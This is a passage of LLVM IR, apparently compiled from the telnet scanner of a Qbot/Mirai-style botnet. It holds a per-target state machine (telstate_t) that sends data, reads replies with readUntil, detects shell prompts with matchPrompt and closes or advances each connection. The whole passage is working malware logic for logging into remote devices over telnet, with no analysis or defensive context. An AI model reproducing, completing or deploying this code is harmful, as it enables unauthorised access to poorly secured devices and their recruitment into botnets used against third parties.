  %1230 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1229
  %1231 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1230, i32 0, i32 0
  %1232 = load i32, i32* %1231, align 16
  %1233 = call i64 @send(i32 %1232, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.62, i32 0, i32 0), i64 2, i32 16384)
  %1234 = icmp slt i64 %1233, 0
  br i1 %1234, label %1235, label %1250

; <label>:1235:                                   ; preds = %1227
  %1236 = load i32, i32* %2, align 4
  %1237 = sext i32 %1236 to i64
  %1238 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1237
  %1239 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1238, i32 0, i32 0
  %1240 = load i32, i32* %1239, align 16
  %1241 = call i32 @sclose(i32 %1240)
  %1242 = load i32, i32* %2, align 4
  %1243 = sext i32 %1242 to i64
  %1244 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1243
  %1245 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1244, i32 0, i32 2
  store i8 0, i8* %1245, align 8
  %1246 = load i32, i32* %2, align 4
  %1247 = sext i32 %1246 to i64
  %1248 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1247
  %1249 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1248, i32 0, i32 3
  store i8 1, i8* %1249, align 1
  br label %2366

; <label>:1250:                                   ; preds = %1227
  %1251 = load i32, i32* %2, align 4
  %1252 = sext i32 %1251 to i64
  %1253 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1252
  %1254 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1253, i32 0, i32 2
  store i8 6, i8* %1254, align 8
  br label %2365

; <label>:1255:                                   ; preds = %73
  %1256 = load i32, i32* %2, align 4
  %1257 = sext i32 %1256 to i64
  %1258 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1257
  %1259 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1258, i32 0, i32 6
  %1260 = load i32, i32* %1259, align 4
  %1261 = icmp eq i32 %1260, 0
  br i1 %1261, label %1262, label %1269

; <label>:1262:                                   ; preds = %1255
  %1263 = call i64 @time(i64* null) #2
  %1264 = trunc i64 %1263 to i32
  %1265 = load i32, i32* %2, align 4
  %1266 = sext i32 %1265 to i64
  %1267 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1266
  %1268 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1267, i32 0, i32 6
  store i32 %1264, i32* %1268, align 4
  br label %1269

; <label>:1269:                                   ; preds = %1262, %1255
  %1270 = load i32, i32* %2, align 4
  %1271 = sext i32 %1270 to i64
  %1272 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1271
  %1273 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1272, i32 0, i32 0
  %1274 = load i32, i32* %1273, align 16
  %1275 = load i32, i32* %2, align 4
  %1276 = sext i32 %1275 to i64
  %1277 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1276
  %1278 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1277, i32 0, i32 8
  %1279 = load i8*, i8** %1278, align 8
  %1280 = load i32, i32* %2, align 4
  %1281 = sext i32 %1280 to i64
  %1282 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1281
  %1283 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1282, i32 0, i32 7
  %1284 = load i16, i16* %1283, align 16
  %1285 = zext i16 %1284 to i32
  %1286 = call i32 @readUntil(i32 %1274, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.63, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1279, i32 1024, i32 %1285)
  %1287 = icmp ne i32 %1286, 0
  br i1 %1287, label %1288, label %1363

; <label>:1288:                                   ; preds = %1269
  %1289 = load i32, i32* %2, align 4
  %1290 = sext i32 %1289 to i64
  %1291 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1290
  %1292 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1291, i32 0, i32 6
  store i32 0, i32* %1292, align 4
  %1293 = load i32, i32* %2, align 4
  %1294 = sext i32 %1293 to i64
  %1295 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1294
  %1296 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1295, i32 0, i32 7
  store i16 0, i16* %1296, align 16
  %1297 = load i32, i32* %2, align 4
  %1298 = sext i32 %1297 to i64
  %1299 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1298
  %1300 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1299, i32 0, i32 8
  %1301 = load i8*, i8** %1300, align 8
  %1302 = call i8* @strstr(i8* %1301, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.63, i32 0, i32 0)) #10
  %1303 = icmp ne i8* %1302, null
  br i1 %1303, label %1304, label %1324

; <label>:1304:                                   ; preds = %1288
  %1305 = load i32, i32* %2, align 4
  %1306 = sext i32 %1305 to i64
  %1307 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1306
  %1308 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1307, i32 0, i32 8
  %1309 = load i8*, i8** %1308, align 8
  call void @llvm.memset.p0i8.i64(i8* %1309, i8 0, i64 1024, i32 1, i1 false)
  %1310 = load i32, i32* %2, align 4
  %1311 = sext i32 %1310 to i64
  %1312 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1311
  %1313 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1312, i32 0, i32 0
  %1314 = load i32, i32* %1313, align 16
  %1315 = call i32 @sclose(i32 %1314)
  %1316 = load i32, i32* %2, align 4
  %1317 = sext i32 %1316 to i64
  %1318 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1317
  %1319 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1318, i32 0, i32 2
  store i8 0, i8* %1319, align 8
  %1320 = load i32, i32* %2, align 4
  %1321 = sext i32 %1320 to i64
  %1322 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1321
  %1323 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1322, i32 0, i32 3
  store i8 0, i8* %1323, align 1
  br label %2366

; <label>:1324:                                   ; preds = %1288
  %1325 = load i32, i32* %2, align 4
  %1326 = sext i32 %1325 to i64
  %1327 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1326
  %1328 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1327, i32 0, i32 8
  %1329 = load i8*, i8** %1328, align 8
  %1330 = call i32 @matchPrompt(i8* %1329)
  %1331 = icmp ne i32 %1330, 0
  br i1 %1331, label %1352, label %1332

; <label>:1332:                                   ; preds = %1324
  %1333 = load i32, i32* %2, align 4
  %1334 = sext i32 %1333 to i64
  %1335 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1334
  %1336 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1335, i32 0, i32 8
  %1337 = load i8*, i8** %1336, align 8
  call void @llvm.memset.p0i8.i64(i8* %1337, i8 0, i64 1024, i32 1, i1 false)
  %1338 = load i32, i32* %2, align 4
  %1339 = sext i32 %1338 to i64
  %1340 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1339
  %1341 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1340, i32 0, i32 0
  %1342 = load i32, i32* %1341, align 16
  %1343 = call i32 @sclose(i32 %1342)
  %1344 = load i32, i32* %2, align 4
  %1345 = sext i32 %1344 to i64
  %1346 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1345
  %1347 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1346, i32 0, i32 2
  store i8 0, i8* %1347, align 8
  %1348 = load i32, i32* %2, align 4
  %1349 = sext i32 %1348 to i64
  %1350 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1349
  %1351 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1350, i32 0, i32 3
  store i8 1, i8* %1351, align 1
  br label %2366

; <label>:1352:                                   ; preds = %1324
  %1353 = load i32, i32* %2, align 4
  %1354 = sext i32 %1353 to i64
  %1355 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1354
  %1356 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1355, i32 0, i32 2
  store i8 7, i8* %1356, align 8
  br label %1357

; <label>:1357:                                   ; preds = %1352
  %1358 = load i32, i32* %2, align 4
  %1359 = sext i32 %1358 to i64
  %1360 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1359
  %1361 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1360, i32 0, i32 8
  %1362 = load i8*, i8** %1361, align 8
  call void @llvm.memset.p0i8.i64(i8* %1362, i8 0, i64 1024, i32 1, i1 false)
  br label %2366

; <label>:1363:                                   ; preds = %1269
  %1364 = load i32, i32* %2, align 4
  %1365 = sext i32 %1364 to i64
  %1366 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1365
  %1367 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1366, i32 0, i32 0
  %1368 = load i32, i32* %1367, align 16
  %1369 = load i32, i32* %2, align 4
  %1370 = sext i32 %1369 to i64
  %1371 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1370
  %1372 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1371, i32 0, i32 8
  %1373 = load i8*, i8** %1372, align 8
  %1374 = load i32, i32* %2, align 4
  %1375 = sext i32 %1374 to i64
  %1376 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1375
  %1377 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1376, i32 0, i32 7
  %1378 = load i16, i16* %1377, align 16
  %1379 = zext i16 %1378 to i32
  %1380 = call i32 @readUntil(i32 %1368, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.64, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1373, i32 1024, i32 %1379)
  %1381 = icmp ne i32 %1380, 0
  br i1 %1381, label %1382, label %1457

; <label>:1382:                                   ; preds = %1363
  %1383 = load i32, i32* %2, align 4
  %1384 = sext i32 %1383 to i64
  %1385 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1384
  %1386 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1385, i32 0, i32 6
  store i32 0, i32* %1386, align 4
  %1387 = load i32, i32* %2, align 4
  %1388 = sext i32 %1387 to i64
  %1389 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1388
  %1390 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1389, i32 0, i32 7
  store i16 0, i16* %1390, align 16
  %1391 = load i32, i32* %2, align 4
  %1392 = sext i32 %1391 to i64
  %1393 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1392
  %1394 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1393, i32 0, i32 8
  %1395 = load i8*, i8** %1394, align 8
  %1396 = call i8* @strstr(i8* %1395, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.64, i32 0, i32 0)) #10
  %1397 = icmp ne i8* %1396, null
  br i1 %1397, label %1398, label %1418

; <label>:1398:                                   ; preds = %1382
  %1399 = load i32, i32* %2, align 4
  %1400 = sext i32 %1399 to i64
  %1401 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1400
  %1402 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1401, i32 0, i32 8
  %1403 = load i8*, i8** %1402, align 8
  call void @llvm.memset.p0i8.i64(i8* %1403, i8 0, i64 1024, i32 1, i1 false)
  %1404 = load i32, i32* %2, align 4
  %1405 = sext i32 %1404 to i64
  %1406 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1405
  %1407 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1406, i32 0, i32 0
  %1408 = load i32, i32* %1407, align 16
  %1409 = call i32 @sclose(i32 %1408)
  %1410 = load i32, i32* %2, align 4
  %1411 = sext i32 %1410 to i64
  %1412 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1411
  %1413 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1412, i32 0, i32 2
  store i8 0, i8* %1413, align 8
  %1414 = load i32, i32* %2, align 4
  %1415 = sext i32 %1414 to i64
  %1416 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1415
  %1417 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1416, i32 0, i32 3
  store i8 0, i8* %1417, align 1
  br label %2366

; <label>:1418:                                   ; preds = %1382
  %1419 = load i32, i32* %2, align 4
  %1420 = sext i32 %1419 to i64
  %1421 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1420
  %1422 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1421, i32 0, i32 8
  %1423 = load i8*, i8** %1422, align 8
  %1424 = call i32 @matchPrompt(i8* %1423)
  %1425 = icmp ne i32 %1424, 0
  br i1 %1425, label %1446, label %1426

; <label>:1426:                                   ; preds = %1418
  %1427 = load i32, i32* %2, align 4
  %1428 = sext i32 %1427 to i64
  %1429 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1428
  %1430 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1429, i32 0, i32 8
  %1431 = load i8*, i8** %1430, align 8
  call void @llvm.memset.p0i8.i64(i8* %1431, i8 0, i64 1024, i32 1, i1 false)
  %1432 = load i32, i32* %2, align 4
  %1433 = sext i32 %1432 to i64
  %1434 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1433
  %1435 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1434, i32 0, i32 0
  %1436 = load i32, i32* %1435, align 16
  %1437 = call i32 @sclose(i32 %1436)
  %1438 = load i32, i32* %2, align 4
  %1439 = sext i32 %1438 to i64
  %1440 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1439
  %1441 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1440, i32 0, i32 2
  store i8 0, i8* %1441, align 8
  %1442 = load i32, i32* %2, align 4
  %1443 = sext i32 %1442 to i64
  %1444 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1443
  %1445 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1444, i32 0, i32 3
  store i8 1, i8* %1445, align 1
  br label %2366

; <label>:1446:                                   ; preds = %1418
  %1447 = load i32, i32* %2, align 4
  %1448 = sext i32 %1447 to i64
  %1449 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1448
  %1450 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1449, i32 0, i32 2
  store i8 7, i8* %1450, align 8
  br label %1451

; <label>:1451:                                   ; preds = %1446
  %1452 = load i32, i32* %2, align 4
  %1453 = sext i32 %1452 to i64
  %1454 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1453
  %1455 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1454, i32 0, i32 8
  %1456 = load i8*, i8** %1455, align 8
  call void @llvm.memset.p0i8.i64(i8* %1456, i8 0, i64 1024, i32 1, i1 false)
  br label %2366

; <label>:1457:                                   ; preds = %1363
  %1458 = load i32, i32* %2, align 4
  %1459 = sext i32 %1458 to i64
  %1460 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1459
  %1461 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1460, i32 0, i32 0
  %1462 = load i32, i32* %1461, align 16
  %1463 = load i32, i32* %2, align 4
  %1464 = sext i32 %1463 to i64
  %1465 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1464
  %1466 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1465, i32 0, i32 8
  %1467 = load i8*, i8** %1466, align 8
  %1468 = load i32, i32* %2, align 4
  %1469 = sext i32 %1468 to i64
  %1470 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1469
  %1471 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1470, i32 0, i32 7
  %1472 = load i16, i16* %1471, align 16
  %1473 = zext i16 %1472 to i32
  %1474 = call i32 @readUntil(i32 %1462, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.65, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1467, i32 1024, i32 %1473)
  %1475 = icmp ne i32 %1474, 0
  br i1 %1475, label %1476, label %1523

; <label>:1476:                                   ; preds = %1457
  %1477 = load i32, i32* %2, align 4
  %1478 = sext i32 %1477 to i64
  %1479 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1478
  %1480 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1479, i32 0, i32 6
  store i32 0, i32* %1480, align 4
  %1481 = load i32, i32* %2, align 4
  %1482 = sext i32 %1481 to i64
  %1483 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1482
  %1484 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1483, i32 0, i32 7
  store i16 0, i16* %1484, align 16
  %1485 = load i32, i32* %2, align 4
  %1486 = sext i32 %1485 to i64
  %1487 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1486
  %1488 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1487, i32 0, i32 8
  %1489 = load i8*, i8** %1488, align 8
  %1490 = call i8* @strstr(i8* %1489, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.65, i32 0, i32 0)) #10
  %1491 = icmp ne i8* %1490, null
  br i1 %1491, label %1492, label %1512

; <label>:1492:                                   ; preds = %1476
  %1493 = load i32, i32* %2, align 4
  %1494 = sext i32 %1493 to i64
  %1495 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1494
  %1496 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1495, i32 0, i32 8
  %1497 = load i8*, i8** %1496, align 8
  call void @llvm.memset.p0i8.i64(i8* %1497, i8 0, i64 1024, i32 1, i1 false)
  %1498 = load i32, i32* %2, align 4
  %1499 = sext i32 %1498 to i64
  %1500 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1499
  %1501 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1500, i32 0, i32 0
  %1502 = load i32, i32* %1501, align 16
  %1503 = call i32 @sclose(i32 %1502)
  %1504 = load i32, i32* %2, align 4
  %1505 = sext i32 %1504 to i64
  %1506 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1505
  %1507 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1506, i32 0, i32 2
  store i8 0, i8* %1507, align 8
  %1508 = load i32, i32* %2, align 4
  %1509 = sext i32 %1508 to i64
  %1510 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1509
  %1511 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1510, i32 0, i32 3
  store i8 0, i8* %1511, align 1
  br label %2366

; <label>:1512:                                   ; preds = %1476
  %1513 = load i32, i32* %2, align 4
  %1514 = sext i32 %1513 to i64
  %1515 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1514
  %1516 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1515, i32 0, i32 2
  store i8 7, i8* %1516, align 8
  br label %1517

; <label>:1517:                                   ; preds = %1512
  %1518 = load i32, i32* %2, align 4
  %1519 = sext i32 %1518 to i64
  %1520 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1519
  %1521 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1520, i32 0, i32 8
  %1522 = load i8*, i8** %1521, align 8
  call void @llvm.memset.p0i8.i64(i8* %1522, i8 0, i64 1024, i32 1, i1 false)
  br label %2366

; <label>:1523:                                   ; preds = %1457
  %1524 = load i32, i32* %2, align 4
  %1525 = sext i32 %1524 to i64
  %1526 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1525
  %1527 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1526, i32 0, i32 0
  %1528 = load i32, i32* %1527, align 16
  %1529 = load i32, i32* %2, align 4
  %1530 = sext i32 %1529 to i64
  %1531 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1530
  %1532 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1531, i32 0, i32 8
  %1533 = load i8*, i8** %1532, align 8
  %1534 = load i32, i32* %2, align 4
  %1535 = sext i32 %1534 to i64
  %1536 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1535
  %1537 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1536, i32 0, i32 7
  %1538 = load i16, i16* %1537, align 16
  %1539 = zext i16 %1538 to i32
  %1540 = call i32 @readUntil(i32 %1528, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.66, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1533, i32 1024, i32 %1539)
  %1541 = icmp ne i32 %1540, 0
  br i1 %1541, label %1542, label %1589

; <label>:1542:                                   ; preds = %1523
  %1543 = load i32, i32* %2, align 4
  %1544 = sext i32 %1543 to i64
  %1545 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1544
  %1546 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1545, i32 0, i32 6
  store i32 0, i32* %1546, align 4
  %1547 = load i32, i32* %2, align 4
  %1548 = sext i32 %1547 to i64
  %1549 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1548
  %1550 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1549, i32 0, i32 7
  store i16 0, i16* %1550, align 16
  %1551 = load i32, i32* %2, align 4
  %1552 = sext i32 %1551 to i64
  %1553 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1552
  %1554 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1553, i32 0, i32 8
  %1555 = load i8*, i8** %1554, align 8
  %1556 = call i8* @strstr(i8* %1555, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.66, i32 0, i32 0)) #10
  %1557 = icmp ne i8* %1556, null
  br i1 %1557, label %1558, label %1578

; <label>:1558:                                   ; preds = %1542
  %1559 = load i32, i32* %2, align 4
  %1560 = sext i32 %1559 to i64
  %1561 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1560
  %1562 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1561, i32 0, i32 8
  %1563 = load i8*, i8** %1562, align 8
  call void @llvm.memset.p0i8.i64(i8* %1563, i8 0, i64 1024, i32 1, i1 false)
  %1564 = load i32, i32* %2, align 4
  %1565 = sext i32 %1564 to i64
  %1566 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1565
  %1567 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1566, i32 0, i32 0
  %1568 = load i32, i32* %1567, align 16
  %1569 = call i32 @sclose(i32 %1568)
  %1570 = load i32, i32* %2, align 4
  %1571 = sext i32 %1570 to i64
  %1572 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1571
  %1573 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1572, i32 0, i32 2
  store i8 0, i8* %1573, align 8
  %1574 = load i32, i32* %2, align 4
  %1575 = sext i32 %1574 to i64
  %1576 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1575
  %1577 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1576, i32 0, i32 3
  store i8 0, i8* %1577, align 1
  br label %2366

; <label>:1578:                                   ; preds = %1542
  %1579 = load i32, i32* %2, align 4
  %1580 = sext i32 %1579 to i64
  %1581 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1580
  %1582 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1581, i32 0, i32 2
  store i8 7, i8* %1582, align 8
  br label %1583

; <label>:1583:                                   ; preds = %1578
  %1584 = load i32, i32* %2, align 4
  %1585 = sext i32 %1584 to i64
  %1586 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1585
  %1587 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1586, i32 0, i32 8
  %1588 = load i8*, i8** %1587, align 8
  call void @llvm.memset.p0i8.i64(i8* %1588, i8 0, i64 1024, i32 1, i1 false)
  br label %2366

; <label>:1589:                                   ; preds = %1523
  %1590 = load i32, i32* %2, align 4
  %1591 = sext i32 %1590 to i64
  %1592 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1591
  %1593 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1592, i32 0, i32 0
  %1594 = load i32, i32* %1593, align 16
  %1595 = load i32, i32* %2, align 4
  %1596 = sext i32 %1595 to i64
  %1597 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1596
  %1598 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1597, i32 0, i32 8
  %1599 = load i8*, i8** %1598, align 8
  %1600 = load i32, i32* %2, align 4
  %1601 = sext i32 %1600 to i64
  %1602 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1601
  %1603 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1602, i32 0, i32 7
  %1604 = load i16, i16* %1603, align 16
  %1605 = zext i16 %1604 to i32
  %1606 = call i32 @readUntil(i32 %1594, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1599, i32 1024, i32 %1605)
  %1607 = icmp ne i32 %1606, 0
  br i1 %1607, label %1608, label %1655

; <label>:1608:                                   ; preds = %1589
  %1609 = load i32, i32* %2, align 4
  %1610 = sext i32 %1609 to i64
  %1611 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1610
  %1612 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1611, i32 0, i32 6
  store i32 0, i32* %1612, align 4
  %1613 = load i32, i32* %2, align 4
  %1614 = sext i32 %1613 to i64
  %1615 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1614
  %1616 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1615, i32 0, i32 7
  store i16 0, i16* %1616, align 16
  %1617 = load i32, i32* %2, align 4
  %1618 = sext i32 %1617 to i64
  %1619 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1618
  %1620 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1619, i32 0, i32 8
  %1621 = load i8*, i8** %1620, align 8
  %1622 = call i8* @strstr(i8* %1621, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i32 0, i32 0)) #10
  %1623 = icmp ne i8* %1622, null
  br i1 %1623, label %1624, label %1644

; <label>:1624:                                   ; preds = %1608
  %1625 = load i32, i32* %2, align 4
  %1626 = sext i32 %1625 to i64
  %1627 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1626
  %1628 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1627, i32 0, i32 8
  %1629 = load i8*, i8** %1628, align 8
  call void @llvm.memset.p0i8.i64(i8* %1629, i8 0, i64 1024, i32 1, i1 false)
  %1630 = load i32, i32* %2, align 4
  %1631 = sext i32 %1630 to i64
  %1632 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1631
  %1633 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1632, i32 0, i32 0
  %1634 = load i32, i32* %1633, align 16
  %1635 = call i32 @sclose(i32 %1634)
  %1636 = load i32, i32* %2, align 4
  %1637 = sext i32 %1636 to i64
  %1638 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1637
  %1639 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1638, i32 0, i32 2
  store i8 0, i8* %1639, align 8
  %1640 = load i32, i32* %2, align 4
  %1641 = sext i32 %1640 to i64
  %1642 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1641
  %1643 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1642, i32 0, i32 3
  store i8 0, i8* %1643, align 1
  br label %2366

; <label>:1644:                                   ; preds = %1608
  %1645 = load i32, i32* %2, align 4
  %1646 = sext i32 %1645 to i64
  %1647 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1646
  %1648 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1647, i32 0, i32 2
  store i8 7, i8* %1648, align 8
  br label %1649

; <label>:1649:                                   ; preds = %1644
  %1650 = load i32, i32* %2, align 4
  %1651 = sext i32 %1650 to i64
  %1652 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1651
  %1653 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1652, i32 0, i32 8
  %1654 = load i8*, i8** %1653, align 8
  call void @llvm.memset.p0i8.i64(i8* %1654, i8 0, i64 1024, i32 1, i1 false)
  br label %2366

